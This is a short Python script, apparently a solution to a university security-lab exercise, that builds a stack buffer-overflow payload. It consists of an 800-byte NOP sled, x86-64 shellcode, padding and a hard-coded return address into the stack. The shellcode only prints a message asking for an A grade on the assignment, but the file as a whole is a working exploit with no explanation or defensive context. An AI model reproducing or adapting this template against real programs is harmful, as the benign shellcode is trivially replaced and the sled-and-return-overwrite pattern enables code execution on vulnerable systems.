import sys

sledSize = 800
bufferSize = 1024

payload = b'\x90'*sledSize # nop sled
shellcode = b'\xeb\x4c\x54\x68\x61\x6e\x6b\x20\x79\x6f\x75\x2c\x20\x58\x58\x58\x58\x58\x2e\x20\x20\x49\x20\x72\x65\x63\x6f\x6d\x6d\x65\x6e\x64\x20\x74\x68\x61\x74\x20\x79\x6f\x75\x20\x67\x65\x74\x20\x61\x20\x67\x72\x61\x64\x65\x20\x6f\x66\x20\x41\x20\x6f\x6e\x20\x74\x68\x69\x73\x20\x61\x73\x73\x69\x67\x6e\x6d\x65\x6e\x74\x2e\x31\xc0\xb0\x01\x48\x31\xff\x40\xb7\x01\x48\x8d\x35\xa3\xff\xff\xff\xb2\x4c\x0f\x05\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05' # shellcode
payload += shellcode
payload += b'\x90' *(bufferSize - sledSize - len(shellcode)) # padding
payload += b'\x8c\xdc\xff\xff\xff\x7f' # return to stack address, 0x7fffffffdc8c

sys.stdout.buffer.write(payload)